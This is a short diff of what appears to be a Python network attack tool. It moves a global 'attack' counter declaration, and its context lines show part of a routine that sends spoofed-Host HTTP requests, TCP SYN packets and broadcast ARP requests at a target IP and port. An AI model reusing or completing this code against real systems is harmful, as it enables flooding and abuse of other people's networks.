@@ -51,6 +51,7 @@ from colorama import Fore, Back, Style, init
 import threading, socket, random, http.client, scapy.all
 from scapy.all import IP, TCP, sr1, ARP, Ether, srp
 
+global attack
 global user_ip
 user_ip = Faker()
 ip_addr = user_ip.ipv4()
@@ -3569,7 +3570,6 @@ elif answer == ("20"):
                         chosen_fake = random.choice(fake)
                         conn = http.client.HTTPConnection(chosen_fake)
                         conn.request("GET", "/" + ip, headers={"Host": chosen_fake})
-                        global attack
                         attack += 1
                         packet = IP(dst=ip) / TCP(dport=port, sport=0x8888, flags="S")
                         arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
@@ -3630,7 +3630,6 @@ elif answer == ("20"):
                         chosen_fake = random.choice(fake)
                         conn = http.client.HTTPConnection(chosen_fake)
                         conn.request("GET", "/" + ip, headers={"Host": chosen_fake})
-                        global attack
                         attack += 1
                         packet = IP(dst=ip) / TCP(dport=port, sport=0x8888, flags="S")
                         arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
